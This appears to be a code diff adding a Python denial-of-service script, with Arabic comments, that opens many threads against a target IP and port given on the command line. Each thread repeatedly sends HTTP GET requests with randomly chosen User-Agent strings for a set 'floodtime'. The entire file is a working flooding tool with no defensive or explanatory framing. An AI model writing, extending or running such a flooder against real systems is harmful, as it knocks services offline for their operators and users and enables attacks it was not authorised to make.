@@ -1,0 +1,38 @@
+import socket
+import time
+import random
+import threading
+from sys import argv
+from threading import Thread
+
+def get_user_agents(file_path):
+    try:
+        with open(file_path, 'r') as f:
+            user_agents = f.readlines()
+        return [ua.strip() for ua in user_agents]
+    except FileNotFoundError:
+        print("User agents file not found.")
+        return []
+
+def tcp(ip, port, floodtime, size, user_agents):
+    end_time = time.time() + floodtime
+    while time.time() < end_time:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            try:
+                sock.connect((ip, port))
+                user_agent = random.choice(user_agents)  # اختيار User-Agent عشوائي
+                request = f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {user_agent}\r\nConnection: keep-alive\r\n\r\n"
+                while time.time() < end_time:
+                    sock.send(request.encode('utf-8'))
+                    time.sleep(0.1)  # لتفادي إغراق الخادم
+            except Exception as e:
+                print(f"Error: {e}")
+                pass
+
+if __name__ == "__main__":
+    user_agents = get_user_agents('Aila/user-agents.txt')  # تحديد مسار ملف user-agents
+    if not user_agents:
+        exit()  # الخروج إذا لم يكن هناك User-Agents
+
+    for _ in range(int(argv[5])):
+        Thread(target=tcp, args=(str(argv[1]), int(argv[2]), int(argv[3]), int(4), user_agents)).start()
